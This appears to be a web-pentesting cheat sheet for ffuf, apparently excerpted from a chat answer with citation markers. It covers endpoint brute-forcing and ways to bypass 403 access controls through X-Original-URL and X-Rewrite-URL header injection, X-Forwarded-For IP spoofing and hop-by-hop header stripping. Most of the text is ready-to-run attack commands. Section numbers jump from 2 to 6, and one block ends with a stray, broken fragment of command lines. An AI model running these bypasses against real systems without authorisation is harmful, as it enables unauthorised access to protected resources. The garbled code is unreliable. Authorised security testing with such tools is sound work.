## 1. Basic Hidden Endpoint Discovery

```bash
# Standard directory/endpoint brute-force (filter out 403 to see what's accessible)
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 50

# With extensions
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.json,.html,.txt,.bak,.old,.zip,.env -mc all -fc 404 -t 50

# Recursive discovery (go deeper into found dirs)
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc all -fc 404 -recursion -recursion-depth 3 -t 30
```

## 2. 403 Bypass via Header Injection

The server may block based on the URL path but trust certain headers to override routing. [[5]]

```bash
# X-Original-URL header bypass (IIS/Nginx/Apache)
ffuf -u https://target.com/ -H "X-Original-URL: /FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 50

# X-Rewrite-URL header bypass
ffuf -u https://target.com/ -H "X-Rewrite-URL: /FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 50

# X-Forwarded-For IP spoofing (bypass IP-based ACLs)
ffuf -u https://target.com/FUZZ -H "X-Forwarded-For: 127.0.0.1" -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 50

# Multiple bypass headers at once
ffuf -u https://target.com/FUZZ \
  -H "X-Original-URL: /FUZZ" \
  -H "X-Rewrite-URL: /FUZZ" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Remote-IP: 127.0.0.1" \
  -H "X-Remote-Addr: 127.0.0.1" \
  -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 50
```

## 6. 403 Bypass via Hop-by-Hop Header Stripping

Force proxies to strip security headers by abusing the `Connection` header. [[5]]

```bash
# Tell the proxy to strip the Authorization/access-control header
ffuf -u https://target.com/admin \
  -H "Connection: X-Custom-Auth" \
  -H "X-Custom-Auth: anything" \
  -mc all -fc 403

  -H "Connection: keep-alive, X-Auth, X-Forwarded-For" \
  -mc all -fc 403
```

## Quick Reference: Key ffuf Flags

| Flag | Purpose |
|------|---------|
| `-u` | Target URL with `FUZZ` keyword |
| `-w` | Wordlist path |
| `-H` | Add header (supports `FUZZ` in value) |
| `-X` | HTTP method (supports `FUZZ`) |
| `-mc` | Match status codes (`all`, `200,301,302`) |
| `-fc` | Filter status codes (`403,404`) |
| `-fs` | Filter response size (calibrate with `-ac`) |
| `-ac` | Auto-calibrate (smart filtering) |
| `-t` | Threads |
| `-recursion` | Recurse into found directories |
| `-o` | Output file |
| `-of` | Output format (`json`, `csv`, `html`) |
| `-s` | Silent mode (only output results) |
| `-rate` | Rate limit (req/s) for stealth |

---

**Pro tip:** Always add `-ac` (auto-calibrate) to let ffuf automatically detect and filter false positives based on response size/word count: [[33]]

```bash
ffuf -u https://target.com/FUZZ -w wordlist.txt -ac -t 50
```

This eliminates the need to manually guess `-fs` or `-fw` filters and catches responses that differ from the baseline — which is exactly what you want when a 403 suddenly becomes a 200.
